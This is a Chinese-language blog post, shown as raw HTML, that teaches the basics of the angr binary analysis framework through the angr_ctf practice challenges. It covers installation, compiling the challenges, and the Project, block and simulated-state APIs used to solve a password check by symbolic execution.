

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ angr æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•">
<meta property="og:url" content="https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ angr æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/11/24/QCpmXeUbcNdozOB.png">
<meta property="article:published_time" content="2022-11-23T15:48:35.000Z">
<meta property="article:modified_time" content="2023-09-14T14:44:15.343Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="angr">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="ç¬¦å·æ‰§è¡Œ">
<meta property="article:tag" content="äºŒè¿›åˆ¶å®‰å…¨">
<meta property="article:tag" content="äºŒè¿›åˆ¶åˆ†æ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2022/11/24/QCpmXeUbcNdozOB.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³• - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"arttnba3.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-11-24 02:48" pubdate>
          2022å¹´11æœˆ24æ—¥ å‡Œæ™¨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          47k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          394 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2023å¹´9æœˆ15æ—¥ å‡Œæ™¨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ <a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦</p>
<span id="more"></span>

<h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a> æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶<strong>æ··åˆ</strong>ï¼ˆConcolicï¼‰åˆ†ææ¡†æ¶ï¼Œä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—å®ç”¨çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼Œæ›´å¤šå…³äº angr çš„ä»‹ç»ä¿¡æ¯å¯ä»¥çœ‹ä»–ä»¬çš„ <a target="_blank" rel="noopener" href="https://angr.io/">å®˜ç½‘</a> ï¼Œå…³äº angr æä¾›çš„ API åˆ™å¯ä»¥æŸ¥çœ‹<a target="_blank" rel="noopener" href="https://api.angr.io/">æ–‡æ¡£</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å…¥é—¨çº§ angr ç»ƒæ‰‹é¡¹ç›®ï¼Œåˆšå¥½ç¬”è€…æœ€è¿‘åœ¨å­¦ angr ç›¸å…³çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šä»è¿™ä¸ªé¡¹ç›®å¼€å§‹å…¥é—¨</p>
<h2 id="PRE-å®‰è£…-angr-åŠç›¸å…³ç»„ä»¶"><a href="#PRE-å®‰è£…-angr-åŠç›¸å…³ç»„ä»¶" class="headerlink" title="PRE.å®‰è£… angr åŠç›¸å…³ç»„ä»¶"></a>PRE.å®‰è£… angr åŠç›¸å…³ç»„ä»¶</h2><p>é¦–å…ˆæ˜¯ä¸€äº›ä¾èµ–é¡¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure>

<p>angr æœ¬ä½“å®‰è£…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯ <a target="_blank" rel="noopener" href="https://github.com/angr/angrop">angrop</a>ï¼Œå¯ä»¥è‡ªåŠ¨æ”¶é›† ROP gadget ä»¥åŠæ„å»º ROP chain</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/angr/patcherex">patcherex</a> ä¹Ÿæ˜¯ angr å›¢é˜Ÿå¼€å‘çš„ï¼Œç”¨ä»¥è¿›è¡Œè‡ªåŠ¨åŒ–çš„äºŒè¿›åˆ¶åŠ å›º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>é˜¿é‡Œäº‘æºå¥½åƒå¦¹æœ‰ <code>compilerex</code> è¿™ä¸ªä¾èµ–é¡¹ï¼Œåæ­£æœ€åğŸ‘´ä¹Ÿå¦¹å®‰è£…ä¸Šï¼Œéš¾å—</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/angr/rex">rex</a> åˆ™æ˜¯ angr å›¢é˜Ÿå¼€å‘çš„è‡ªåŠ¨ exp ç”Ÿæˆå™¨</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ğŸ‘´å¦¹å®‰æˆï¼Œçœ‹çœ‹å°±å¥½</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/angr/angr-management">angr-management</a> åˆ™æ˜¯å›¾å½¢åŒ–çš„ angr ç•Œé¢ï¼Œå®‰å¥½ä¹‹åç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ <code>angr-management</code> å³å¯ç›´æ¥å¯åŠ¨</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure>

<h2 id="PRE2-angr-ctf-åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—"><a href="#PRE2-angr-ctf-åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—" class="headerlink" title="PRE2. angr-ctf åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—"></a>PRE2. angr-ctf åŸºæœ¬é£Ÿç”¨æŒ‡åŒ—</h2><p>é¦–å…ˆæŠŠé¡¹ç›®æ‹‰åˆ°æœ¬åœ°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åè¿›å…¥åˆ°ä½ æƒ³åšçš„é¢˜ç›®ç›®å½•ä¸‹ä½¿ç”¨è„šæœ¬è¿›è¡Œç¼–è¯‘ï¼Œæ¯”å¦‚è¯´ <code>00_angr_find</code>ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªç§å­ä»¥åŠè¾“å‡ºçš„æ–‡ä»¶åï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] [output_file]<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py 114514 00_angr_find</span><br></code></pre></td></tr></table></figure>

<h1 id="0x01-angr-ctfï¼šåŸºæœ¬ç”¨æ³•"><a href="#0x01-angr-ctfï¼šåŸºæœ¬ç”¨æ³•" class="headerlink" title="0x01. angr-ctfï¼šåŸºæœ¬ç”¨æ³•"></a>0x01. angr-ctfï¼šåŸºæœ¬ç”¨æ³•</h1><h2 id="00-angr-findï¼šè·¯å¾„æœç´¢"><a href="#00-angr-findï¼šè·¯å¾„æœç´¢" class="headerlink" title="00_angr_findï¼šè·¯å¾„æœç´¢"></a>00_angr_findï¼šè·¯å¾„æœç´¢</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå‘ç°å…¶ä¼šè¯»å…¥ 8 å­—èŠ‚åä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°å¤„ç†ï¼Œæœ€åä¸å¯†ç  <code>&quot;XFQUUEQF&quot;</code> å¯¹æ¯”ï¼š<br><img src="https://s2.loli.net/2022/10/31/vcWPp1GO7uHA8q6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æŒ‰ç…§ä¼ ç»Ÿçš„åšé€†å‘çš„æ–¹æ³•æ˜¯å»é€† <code>complex_function()</code> ï¼Œé€†å‡ºé€»è¾‘åå†™å‡ºè§£å¯†è„šæœ¬ï¼Œä½†æœ‰äº† angr ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨<strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆsymbolic executionï¼‰æ¥è¿›è¡Œè·¯å¾„çº¦æŸçš„è‡ªåŠ¨æ±‚è§£</p>
<blockquote>
<p>ç¬¦å·æ‰§è¡Œç®€å•ç†è§£ä¾¿æ˜¯å°†å˜é‡ä½œä¸ºç¬¦å·å­˜å‚¨ï¼Œé€šè¿‡åˆ†æè·¯å¾„çº¦æŸè·å¾—ç”±ç¬¦å·ç»„æˆçš„è¡¨è¾¾å¼ç»„ï¼Œæœ€åå¯¹å…¶è¿›è¡Œæ±‚è§£</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ±‚è§£çš„è·¯å¾„çº¦æŸä¾¿æ˜¯æ‰§è¡Œåˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> çš„è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©æœ€åçš„è¾“å‡ºç‚¹ <code>0x80492F0</code>ï¼š</p>
<p><img src="https://s2.loli.net/2022/10/31/hdaX8FY9ZVcvIRH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥çœ‹ angr çš„åŸºæœ¬ç”¨æ³•</p>
<h3 id="angr-Project-é¡¶å±‚æ¥å£"><a href="#angr-Project-é¡¶å±‚æ¥å£" class="headerlink" title="angr.Project - é¡¶å±‚æ¥å£"></a>angr.Project - é¡¶å±‚æ¥å£</h3><p>æˆ‘ä»¬è‹¥è¦ä½¿ç”¨ angr æ¥åˆ†æä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç¬¬ä¸€æ­¥åˆ™æ˜¯åˆ›å»ºä¸€ä¸ª <code>angr.Project</code> ç±»â€”â€”æˆ‘ä»¬ä¸€åˆ‡åç»­æ“ä½œéƒ½å°†åŸºäºè¿™ä¸ªç±»å®ä¾‹è¿›è¡Œå±•å¼€ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span> <span class="hljs-comment"># file to be analyzed</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(bin_path)<br>WARNING | <span class="hljs-number">2022</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">30</span>,006 | cle.loader | The main binary <span class="hljs-keyword">is</span> a position-independent executable. It <span class="hljs-keyword">is</span> being loaded <span class="hljs-keyword">with</span> a base address of <span class="hljs-number">0x400000</span>.<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ª project è·å–å¯¹åº”äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch     <span class="hljs-comment"># architecture of the binary file</span><br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(proj.entry)    <span class="hljs-comment"># entry point of the binary file</span><br><span class="hljs-string">&#x27;0x401060&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename <span class="hljs-comment"># name of the binary file</span><br><span class="hljs-string">&#x27;./test&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>arch</code> æ˜¯ä¸€ä¸ª <code>archiinfo.Arch</code> ç±»å®ä¾‹ï¼Œå…¶åŒ…å«äº†è¿è¡Œè¯¥æ–‡ä»¶çš„ CPU ä¿¡æ¯ç­‰å„ç§æ•°æ®</p>
<ul>
<li><p><code>arch.bits</code> &amp; <code>arch.bytes</code> ï¼šCPU çš„å­—é•¿ï¼ˆå•ä½ä¸ºä½&#x2F;å­—èŠ‚ï¼‰</p>
</li>
<li><p><code>arch.name</code>ï¼šæ¶æ„åï¼Œä¾‹å¦‚  <em>X86</em>  </p>
</li>
<li><p><code>arch.memory_endness</code>ï¼šç«¯åºï¼Œå¤§ç«¯ä¸º <code>Endness.BE</code> ï¼Œå°ç«¯ä¸º <code>Endness.LE</code></p>
<blockquote>
<p>æºç é‡Œè¿˜æœ‰ä¸€ä¸ª â€œä¸­ç«¯åºâ€ <code>Endness.ME</code> ï¼šï¼‰</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="â‘ -factory-å®ç”¨ç±»å·¥å‚"><a href="#â‘ -factory-å®ç”¨ç±»å·¥å‚" class="headerlink" title="â‘  factory - å®ç”¨ç±»å·¥å‚"></a>â‘  factory - å®ç”¨ç±»å·¥å‚</h4><p><code>project.factory</code> ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å®ç”¨çš„ç±»çš„æ„é€ å™¨</p>
<h5 id="I-block-åŸºæœ¬å—"><a href="#I-block-åŸºæœ¬å—" class="headerlink" title="I. block - åŸºæœ¬å—"></a>I. block - åŸºæœ¬å—</h5><p>angr ä»¥åŸºæœ¬å—ä¸ºå•ä½åˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>project.factory.block(address)</code> è·å–ç»™å®šåœ°å€æ‰€åœ¨çš„<strong>åŸºæœ¬å—</strong>â€”â€”ä¸€ä¸ª <code>Block</code> ç±»å®ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure>

<h5 id="II-state-æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€"><a href="#II-state-æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€" class="headerlink" title="II. state - æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€"></a>II. state - æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€</h5><p>angr ä½¿ç”¨ <code>SimState</code> ç±»è¡¨ç¤ºä¸€ä¸ª <em>æ¨¡æ‹Ÿçš„ç¨‹åºçŠ¶æ€</em>  ï¼ˆsimulated program stateï¼‰ï¼Œæˆ‘ä»¬çš„å„ç§æ“ä½œå®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ª state æ­¥è¿›åˆ°å¦ä¸€ä¸ª state çš„è¿‡ç¨‹</p>
<p>æˆ‘ä»¬ä½¿ç”¨ <code>project.factory.entry_state()</code> è·å–ä¸€ä¸ªç¨‹åºçš„åˆå§‹æ‰§è¡ŒçŠ¶æ€ï¼Œä½¿ç”¨ <code>project.factory.blank_state(addr)</code> è·å–ä¸€ä¸ªç¨‹åºä»æŒ‡å®šåœ°å€å¼€å§‹æ‰§è¡Œçš„ç©ºç™½çŠ¶æ€ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li><code>state.regs</code>ï¼šå¯„å­˜å™¨çŠ¶æ€ç»„ï¼Œå…¶ä¸­æ¯ä¸ªå¯„å­˜å™¨éƒ½ä¸ºä¸€ä¸ª  <em>ä½å‘é‡</em>  ï¼ˆBitVectorï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯„å­˜å™¨åç§°æ¥è®¿é—®å¯¹åº”çš„å¯„å­˜å™¨ï¼ˆä¾‹å¦‚ <code>state.regs.esp -= 12</code> ï¼‰</li>
<li><code>state.mem</code>ï¼šè¯¥çŠ¶æ€çš„å†…å­˜è®¿é—®æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>state.mem[addr].type</code> å®Œæˆå†…å­˜è®¿é—®ï¼ˆä¾‹å¦‚ <code>state.mem[0x1000].long = 4</code> ï¼Œå¯¹äºè¯»è€Œè¨€è¿˜éœ€æŒ‡å®š <code>.resolved</code> æˆ– <code>.concrete</code> è¡¨ç¤ºä½å‘é‡æˆ–æ˜¯å®é™…å€¼ï¼Œä¾‹å¦‚ <code>state.mem[0x1000].long.concrete</code>ï¼‰</li>
<li><code>state.memory</code>ï¼šå¦ä¸€ç§å½¢å¼çš„å†…å­˜è®¿é—®æ¥å£ï¼š<ul>
<li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li>
<li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li>
</ul>
</li>
